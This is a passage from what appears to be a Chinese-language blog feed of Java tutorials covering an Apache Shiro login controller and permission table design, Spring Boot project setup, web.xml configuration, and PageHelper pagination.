class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line">public class LoginController &#123;</span><br><span class="line">    @RequestMapping(&quot;/login&quot;)</span><br><span class="line">    public String login(</span><br><span class="line">            @RequestParam(value = &quot;username&quot;, required = false) String username,</span><br><span class="line">            @RequestParam(value = &quot;password&quot;, required = false) String password,</span><br><span class="line">            Model model) &#123;</span><br><span class="line">        String error = null;</span><br><span class="line">        if (username != null &amp;&amp; password != null) &#123;</span><br><span class="line">            //初始化</span><br><span class="line">            Subject subject = SecurityUtils.getSubject();</span><br><span class="line">            UsernamePasswordToken token = new UsernamePasswordToken(username, password);</span><br><span class="line">            try &#123;</span><br><span class="line">                //登录，即身份校验，由通过Spring注入的UserRealm会自动校验输入的用户名和密码在数据库中是否有对应的值</span><br><span class="line">                subject.login(token);</span><br><span class="line">                return &quot;redirect:index.do&quot;;</span><br><span class="line">            &#125;catch (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                error = &quot;未知错误，错误信息：&quot; + e.getMessage();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            error = &quot;请输入用户名和密码&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        //登录失败，跳转到login页面，这里不做登录成功的处理，由</span><br><span class="line">        model.addAttribute(&quot;error&quot;, error);</span><br><span class="line">        return &quot;login&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p> 上面是一个login的controller。从前端获得获得字段为username,password。然后进行判断。<br> 当前端没有输入账号或者密码直接error，然后跳转到login。<br> 若两个字段都输入了的话。subject.login(token)进行登录，随后就是通过Realm进行登录校验，如果登录失败就可能抛出一系列异常，比如UnknownAccountException用户账户不存在异常、IncorrectCredentialsException用户名或密码错误异常、LockedAccountException账户锁定异常… 。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
            <tag> shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiroの表结构设计</title>
      <link href="/2019/04/29/shironobiao-jie-gou-she-ji/"/>
      <url>/2019/04/29/shironobiao-jie-gou-she-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="Shiroの表结构设计"><a href="#Shiroの表结构设计" class="headerlink" title="Shiroの表结构设计"></a>Shiroの表结构设计</h1><blockquote><p>  通常我们的权限设计都是 用户–角色–权限 ,其中角色是我们写代码的人没法控制的,它可以有多条权限,每个用户又可以设计为拥有多个角色.因此如果从角色着手进行权限验证,系统都必须根据用户的配置动起来,非常复杂.角色的作用其实只是用来管理分配权限的,真正的验证只验证权限。</p></blockquote><h2 id="1-表设计"><a href="#1-表设计" class="headerlink" title="1.表设计"></a>1.表设计</h2><h3 id="1-1数据库结构"><a href="#1-1数据库结构" class="headerlink" title="1.1数据库结构"></a>1.1数据库结构</h3><p> -users 用户表<br> -roles 角色表<br> -permissions 权限表<br> -users_roles 用户角色关联表<br> -roles_permissions 角色权限关联表</p><h2 id="2-创建表"><a href="#2-创建表" class="headerlink" title="2.创建表"></a>2.创建表</h2><h3 id="2-1users表"><a href="#2-1users表" class="headerlink" title="2.1users表"></a>2.1users表</h3><p><img src="https://image.kalifun.top/upload/1904/524f7a79cf3bcbae.png" alt="![524f7a79cf3bcbae.png](https://image.kalifun.top/upload/1904/524f7a79cf3bcbae.png)"><br>可能最关心的就是locked这个字段吧，它的类型为TINYINT。这个值只能是0、1.当我们使用mybatis时，获得这个类型的数据是0时会转为false。</p><h3 id="2-2roles表"><a href="#2-2roles表" class="headerlink" title="2.2roles表"></a>2.2roles表</h3><p><img src="https://image.kalifun.top/upload/1904/b3fcda6dc4900f46.png" alt="![b3fcda6dc4900f46.png](https://image.kalifun.top/upload/1904/b3fcda6dc4900f46.png)"><br>pid表示父节点，就是说，当前的角色可能有上级节点，比如老师，这个角色可能就有父节点计科教师，如果存在父节点，这个字段值就是父级节点的ID，根据这个ID，在展示数据的时候就很方便的展示出其在哪个父节点下。</p><h3 id="2-3users-roles表格"><a href="#2-3users-roles表格" class="headerlink" title="2.3users_roles表格"></a>2.3users_roles表格</h3><p><img src="https://image.kalifun.top/upload/1904/48955f65b0730ad9.png" alt="![48955f65b0730ad9.png](https://image.kalifun.top/upload/1904/48955f65b0730ad9.png)"><br> 这张表主要描述指定用户与角色间的依赖关系。</p><h3 id="2-4permissions表"><a href="#2-4permissions表" class="headerlink" title="2.4permissions表"></a>2.4permissions表</h3><p><img src="https://image.kalifun.top/upload/1904/f01be9f000a1a985.png" alt="![f01be9f000a1a985.png](https://image.kalifun.top/upload/1904/f01be9f000a1a985.png)"></p><h3 id="2-5roles-permissions表"><a href="#2-5roles-permissions表" class="headerlink" title="2.5roles_permissions表"></a>2.5roles_permissions表</h3><p><img src="https://image.kalifun.top/upload/1904/527412228ce38f2c.png" alt="![527412228ce38f2c.png](https://image.kalifun.top/upload/1904/527412228ce38f2c.png)"><br>主要描述角色和权限间的依赖关系</p><h2 id="3-创建源码"><a href="#3-创建源码" class="headerlink" title="3.创建源码"></a>3.创建源码</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">-- --------------------------------------------------------</span><br><span class="line">-- 主机:                           127.0.0.1</span><br><span class="line">-- 服务器版本:                        10.3.10-MariaDB - mariadb.org binary distribution</span><br><span class="line">-- 服务器操作系统:                      Win64</span><br><span class="line">-- HeidiSQL 版本:                  9.4.0.5125</span><br><span class="line">-- --------------------------------------------------------</span><br><span class="line"></span><br><span class="line">/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;</span><br><span class="line">/*!40101 SET NAMES utf8 */;</span><br><span class="line">/*!50503 SET NAMES utf8mb4 */;</span><br><span class="line">/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;</span><br><span class="line">/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE=&apos;NO_AUTO_VALUE_ON_ZERO&apos; */;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- 导出 imgurl 的数据库结构</span><br><span class="line">CREATE DATABASE IF NOT EXISTS `imgurl` /*!40100 DEFAULT CHARACTER SET latin1 */;</span><br><span class="line">USE `imgurl`;</span><br><span class="line"></span><br><span class="line">-- 导出  表 imgurl.permissions 结构</span><br><span class="line">CREATE TABLE IF NOT EXISTS `permissions` (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `permission` int(11) NOT NULL DEFAULT 0 COMMENT &apos;权限编号&apos;,</span><br><span class="line">  `description` int(11) NOT NULL DEFAULT 0 COMMENT &apos;权限描述&apos;,</span><br><span class="line">  `rid` int(11) NOT NULL DEFAULT 0 COMMENT &apos;权限关联角色&apos;,</span><br><span class="line">  `available` int(11) NOT NULL DEFAULT 0 COMMENT &apos;是否锁定&apos;,</span><br><span class="line">  PRIMARY KEY (`id`),</span><br><span class="line">  UNIQUE KEY `users_roles_permission` (`permission`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=latin1;</span><br><span class="line"></span><br><span class="line">-- 数据导出被取消选择。</span><br><span class="line">-- 导出  表 imgurl.roles 结构</span><br><span class="line">CREATE TABLE IF NOT EXISTS `roles` (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `role` varchar(50) NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;角色名称&apos;,</span><br><span class="line">  `description` varchar(150) NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;角色描述&apos;,</span><br><span class="line">  `pid` int(11) NOT NULL DEFAULT 0 COMMENT &apos;父节点&apos;,</span><br><span class="line">  `available` tinyint(4) NOT NULL DEFAULT 0 COMMENT &apos;是否锁定&apos;,</span><br><span class="line">  PRIMARY KEY (`id`),</span><br><span class="line">  UNIQUE KEY `roles_role` (`role`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=latin1;</span><br><span class="line"></span><br><span class="line">-- 数据导出被取消选择。</span><br><span class="line">-- 导出  表 imgurl.roles_permissions 结构</span><br><span class="line">CREATE TABLE IF NOT EXISTS `roles_permissions` (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `roles_id` int(11) DEFAULT 0 COMMENT &apos;角色编号&apos;,</span><br><span class="line">  `permissions_id` int(11) DEFAULT 0 COMMENT &apos;权限编号&apos;,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=latin1;</span><br><span class="line"></span><br><span class="line">-- 数据导出被取消选择。</span><br><span class="line">-- 导出  表 imgurl.users 结构</span><br><span class="line">CREATE TABLE IF NOT EXISTS `users` (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT &apos;id&apos;,</span><br><span class="line">  `username` varchar(50) NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;用户名&apos;,</span><br><span class="line">  `password` varchar(50) NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;密码&apos;,</span><br><span class="line">  `salt` varchar(50) NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;盐值&apos;,</span><br><span class="line">  `role_id` varchar(50) NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;角色id&apos;,</span><br><span class="line">  `locked` tinyint(1) NOT NULL DEFAULT 0 COMMENT &apos;锁定&apos;,</span><br><span class="line">  PRIMARY KEY (`id`),</span><br><span class="line">  UNIQUE KEY `users_username` (`username`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=latin1;</span><br><span class="line"></span><br><span class="line">-- 数据导出被取消选择。</span><br><span class="line">-- 导出  表 imgurl.users_roles 结构</span><br><span class="line">CREATE TABLE IF NOT EXISTS `users_roles` (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `user_id` int(20) NOT NULL DEFAULT 0 COMMENT &apos;用户编号&apos;,</span><br><span class="line">  `role_id` int(20) NOT NULL DEFAULT 0 COMMENT &apos;角色编号&apos;,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=latin1;</span><br><span class="line"></span><br><span class="line">-- 数据导出被取消选择。</span><br><span class="line">/*!40101 SET SQL_MODE=IFNULL(@OLD_SQL_MODE, &apos;&apos;) */;</span><br><span class="line">/*!40014 SET FOREIGN_KEY_CHECKS=IF(@OLD_FOREIGN_KEY_CHECKS IS NULL, 1, @OLD_FOREIGN_KEY_CHECKS) */;</span><br><span class="line">/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
            <tag> shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot从入门到入门</title>
      <link href="/2019/04/29/spring-boot-cong-ru-men-dao-ru-men/"/>
      <url>/2019/04/29/spring-boot-cong-ru-men-dao-ru-men/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-Boot从入门到入门"><a href="#Spring-Boot从入门到入门" class="headerlink" title="Spring Boot从入门到入门"></a>Spring Boot从入门到入门</h1><h2 id="什么是Spring-Boot"><a href="#什么是Spring-Boot" class="headerlink" title="什么是Spring Boot"></a>什么是Spring Boot</h2><blockquote><h4 id="Spring-Boot是由Pivotal团队提供的全新框架，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。"><a href="#Spring-Boot是由Pivotal团队提供的全新框架，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。" class="headerlink" title="Spring Boot是由Pivotal团队提供的全新框架，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。"></a>Spring Boot是由Pivotal团队提供的全新框架，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。</h4></blockquote><h2 id="Spring-Boot的优点"><a href="#Spring-Boot的优点" class="headerlink" title="Spring Boot的优点"></a>Spring Boot的优点</h2><ul><li><h3 id="自动配置：无需繁琐的去配置web-xml，spring-mvc-xml等"><a href="#自动配置：无需繁琐的去配置web-xml，spring-mvc-xml等" class="headerlink" title="自动配置：无需繁琐的去配置web.xml，spring-mvc.xml等"></a>自动配置：无需繁琐的去配置web.xml，spring-mvc.xml等</h3><h2 id="新建项目"><a href="#新建项目" class="headerlink" title="新建项目"></a>新建项目</h2><h3 id="1-选择-Spring-Initializr"><a href="#1-选择-Spring-Initializr" class="headerlink" title="1.选择 Spring Initializr"></a>1.选择 Spring Initializr</h3><img src="https://image.kalifun.top/upload/1904/e98e4d34feff6ab4.png" alt="![e98e4d34feff6ab4.png](https://image.kalifun.top/upload/1904/e98e4d34feff6ab4.png)"><h3 id="2-设置项目信息"><a href="#2-设置项目信息" class="headerlink" title="2.设置项目信息"></a>2.设置项目信息</h3><img src="https://image.kalifun.top/upload/1904/e3600e2d4e78a533.png" alt="![e3600e2d4e78a533.png](https://image.kalifun.top/upload/1904/e3600e2d4e78a533.png)"><h3 id="3-选择WEB"><a href="#3-选择WEB" class="headerlink" title="3.选择WEB"></a>3.选择WEB</h3><img src="https://image.kalifun.top/upload/1904/3b30c3c7c9615614.png" alt="![3b30c3c7c9615614.png](https://image.kalifun.top/upload/1904/3b30c3c7c9615614.png)"><h3 id="4-确认存放路径"><a href="#4-确认存放路径" class="headerlink" title="4.确认存放路径"></a>4.确认存放路径</h3><img src="https://image.kalifun.top/upload/1904/41bdcb9c19891132.png" alt="![41bdcb9c19891132.png](https://image.kalifun.top/upload/1904/41bdcb9c19891132.png)"><h3 id="5-选择自动导入"><a href="#5-选择自动导入" class="headerlink" title="5.选择自动导入"></a>5.选择自动导入</h3><h4 id="当我们修改pom-xml时，它会自动导入包，所以建议选择自动导入。"><a href="#当我们修改pom-xml时，它会自动导入包，所以建议选择自动导入。" class="headerlink" title="当我们修改pom.xml时，它会自动导入包，所以建议选择自动导入。"></a>当我们修改pom.xml时，它会自动导入包，所以建议选择自动导入。</h4><img src="https://image.kalifun.top/upload/1904/56ad9edae31845d5.png" alt="![56ad9edae31845d5.png](https://image.kalifun.top/upload/1904/56ad9edae31845d5.png)"><h3 id="6-加载完毕"><a href="#6-加载完毕" class="headerlink" title="6.加载完毕"></a>6.加载完毕</h3><img src="https://image.kalifun.top/upload/1904/f4a64e176802e8f8.png" alt="![f4a64e176802e8f8.png](https://image.kalifun.top/upload/1904/f4a64e176802e8f8.png)"></li><li><h4 id="DemoApplication-是一个启动程序。你一个直接选择run它。"><a href="#DemoApplication-是一个启动程序。你一个直接选择run它。" class="headerlink" title="DemoApplication 是一个启动程序。你一个直接选择run它。"></a>DemoApplication 是一个启动程序。你一个直接选择run它。</h4></li><li><h4 id="application-properties-将需要的配置往里塞。前面ssm中，我们存放的是数据库配置。"><a href="#application-properties-将需要的配置往里塞。前面ssm中，我们存放的是数据库配置。" class="headerlink" title="application.properties 将需要的配置往里塞。前面ssm中，我们存放的是数据库配置。"></a>application.properties 将需要的配置往里塞。前面ssm中，我们存放的是数据库配置。</h4></li><li><h4 id="DemoApplicationTests-一个测试程序，可以利用它快速编写测试程序某个功能实现。"><a href="#DemoApplicationTests-一个测试程序，可以利用它快速编写测试程序某个功能实现。" class="headerlink" title="DemoApplicationTests 一个测试程序，可以利用它快速编写测试程序某个功能实现。"></a>DemoApplicationTests 一个测试程序，可以利用它快速编写测试程序某个功能实现。</h4></li><li><h4 id="pom-xml-就不需要解释啦。Maven构建说明文件。"><a href="#pom-xml-就不需要解释啦。Maven构建说明文件。" class="headerlink" title="pom.xml 就不需要解释啦。Maven构建说明文件。"></a>pom.xml 就不需要解释啦。<a href="https://kalifun.top/archives/110" target="_blank" rel="noopener">Maven</a>构建说明文件。</h4></li></ul><h2 id="后续配合案例"><a href="#后续配合案例" class="headerlink" title="后续配合案例"></a>后续配合案例</h2>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVAのweb.xml</title>
      <link href="/2019/04/26/javanoweb/"/>
      <url>/2019/04/26/javanoweb/</url>
      
        <content type="html"><![CDATA[<h1 id="JAVAのweb-xml"><a href="#JAVAのweb-xml" class="headerlink" title="JAVAのweb.xml"></a>JAVAのweb.xml</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>要问我web.xml是什么，我也模糊不清。这个大概就是整个项目是一辆车，而web.xml就是这把车钥匙🔑吧，如果没有它或者损坏了它？我们就没有把这个web项目跑起来。所以Web项目中,Web.xml还是很重要的。</p></blockquote><h2 id="1-分解"><a href="#1-分解" class="headerlink" title="1.分解"></a>1.分解</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot;</span><br><span class="line">         version=&quot;3.1&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">      &lt;param-name&gt;encoding&lt;/param-name&gt;</span><br><span class="line">      &lt;param-value&gt;UTF-8&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">  &lt;/filter&gt;</span><br><span class="line"></span><br><span class="line">  &lt;filter-mapping&gt;</span><br><span class="line">    &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/filter-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;SpringMVC&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">      &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span><br><span class="line">      &lt;param-value&gt;classpath:spring/spring-*.xml&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line">    &lt;async-supported&gt;true&lt;/async-supported&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;SpringMVC&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure></div><h3 id="1-1web-app"><a href="#1-1web-app" class="headerlink" title="1.1web-app"></a>1.1web-app</h3><blockquote><p> web-app 是描述文件，里面有的元素是我们对这个项目的定义描述。2.4版本以后无需安装DTD指定元素顺序来写文件。</p></blockquote><h3 id="1-2filter"><a href="#1-2filter" class="headerlink" title="1.2filter"></a>1.2filter</h3><blockquote><p> Filter对用户请求进行预处理，接着将请求交给Servlet进行处理并生成响应，最后Filter再对服务器响应进行后处理。</p></blockquote><h3 id="1-3-servlet"><a href="#1-3-servlet" class="headerlink" title="1.3 servlet"></a>1.3 servlet</h3><blockquote><p> Servlet通常称为服务端小程序，是服务端的程序，用于处理及响应客户的请求。</p></blockquote><h3 id="1-4-servlet-mapping"><a href="#1-4-servlet-mapping" class="headerlink" title="1.4 servlet-mapping"></a>1.4 servlet-mapping</h3><blockquote><p> url-pattern 指的是这个目录下的所以资源都将会到servlet下处理。如果我们修改为*.do则表示复合这样的请求格式都将会被servlet处理。</p></blockquote><h2 id="学习资料列表"><a href="#学习资料列表" class="headerlink" title="学习资料列表"></a>学习资料列表</h2><ul><li><a href="http://www.cnblogs.com/vanl/p/5742501.html" target="_blank" rel="noopener">JavaWeb中filter的详解及应用案例</a></li><li><a href="https://www.cnblogs.com/vanl/p/5737656.html" target="_blank" rel="noopener">web.xml详解</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java分页のPageHelper</title>
      <link href="/2019/04/19/java-fen-ye-nopagehelper/"/>
      <url>/2019/04/19/java-fen-ye-nopagehelper/</url>
      
        <content type="html"><![CDATA[<h1 id="Java分页のPageHelper"><a href="#Java分页のPageHelper" class="headerlink" title="Java分页のPageHelper"></a>Java分页のPageHelper</h1><h2 id="为什么选择PageHelper"><a href="#为什么选择PageHelper" class="headerlink" title="为什么选择PageHelper"></a>为什么选择PageHelper</h2><blockquote><p> 一听到分页很多人第一反应利用jQuery不就可以啦，我一开始也是这么想的。但是对于没有学过前端的人来说，真的懒得看前端怎么实现分页功能的。唉，除了懒感觉自己没有别的优点了。 </p><ul><li><h4 id="利用超少代码实现分页功能。"><a href="#利用超少代码实现分页功能。" class="headerlink" title="利用超少代码实现分页功能。"></a>利用超少代码实现分页功能。</h4></li><li><h4 id="快速实现，不需要繁琐的前端知识。"><a href="#快速实现，不需要繁琐的前端知识。" class="headerlink" title="快速实现，不需要繁琐的前端知识。"></a>快速实现，不需要繁琐的前端知识。</h4></li></ul></blockquote><h2 id="PageHelper实现步骤"><a href="#PageHelper实现步骤" class="headerlink" title="PageHelper实现步骤"></a>PageHelper实现步骤</h2><h3 id="1-1-配置pom-xml实现导包"><a href="#1-1-配置pom-xml实现导包" class="headerlink" title="1.1 配置pom.xml实现导包"></a>1.1 配置pom.xml实现导包</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;com.github.pagehelper&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;pagehelper&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;4.1.6&lt;/version&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div><p> 建议高版本，因为我在低版本时功能无法实现。</p><h3 id="1-2配置mybatis"><a href="#1-2配置mybatis" class="headerlink" title="1.2配置mybatis"></a>1.2配置mybatis</h3><p> 因为我们是针对数据库查询后，进行数据分页。这也算是为什么选择它的原因。</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 配置SqlSessionFactory对象 --&gt;</span><br><span class="line">    &lt;bean id=&quot;sqlSessionFactory&quot; class=&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;&gt;</span><br><span class="line">        &lt;!-- 注入数据库连接池 --&gt;</span><br><span class="line">        &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;/&gt;</span><br><span class="line">        &lt;!-- 扫描entity包 使用别名 --&gt;</span><br><span class="line">        &lt;property name=&quot;typeAliasesPackage&quot; value=&quot;com.label.entity&quot;/&gt;</span><br><span class="line">        &lt;!-- 扫描sql配置文件:mapper需要的xml文件 --&gt;</span><br><span class="line">        &lt;property name=&quot;mapperLocations&quot; value=&quot;classpath:mapper/*.xml&quot;/&gt;</span><br><span class="line">        &lt;!--设置PageHelper--&gt;</span><br><span class="line">        &lt;property name=&quot;plugins&quot;&gt;</span><br><span class="line">            &lt;array&gt;</span><br><span class="line">                &lt;bean class=&quot;com.github.pagehelper.PageHelper&quot;&gt;</span><br><span class="line">                    &lt;property name=&quot;properties&quot;&gt;</span><br><span class="line">                        &lt;value&gt;</span><br><span class="line">                          &lt;!-- 还有其他设置，可以自己去看文档根据自己需求进行设置--&gt;</span><br><span class="line">                            dialect=mysql</span><br><span class="line">                        &lt;/value&gt;</span><br><span class="line">                    &lt;/property&gt;</span><br><span class="line">                &lt;/bean&gt;</span><br><span class="line">            &lt;/array&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br></pre></td></tr></table></figure></div><h3 id="1-3SSM代码"><a href="#1-3SSM代码" class="headerlink" title="1.3SSM代码"></a>1.3SSM代码</h3><p> controller与前端交互</p><blockquote><p> controller片段代码</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td 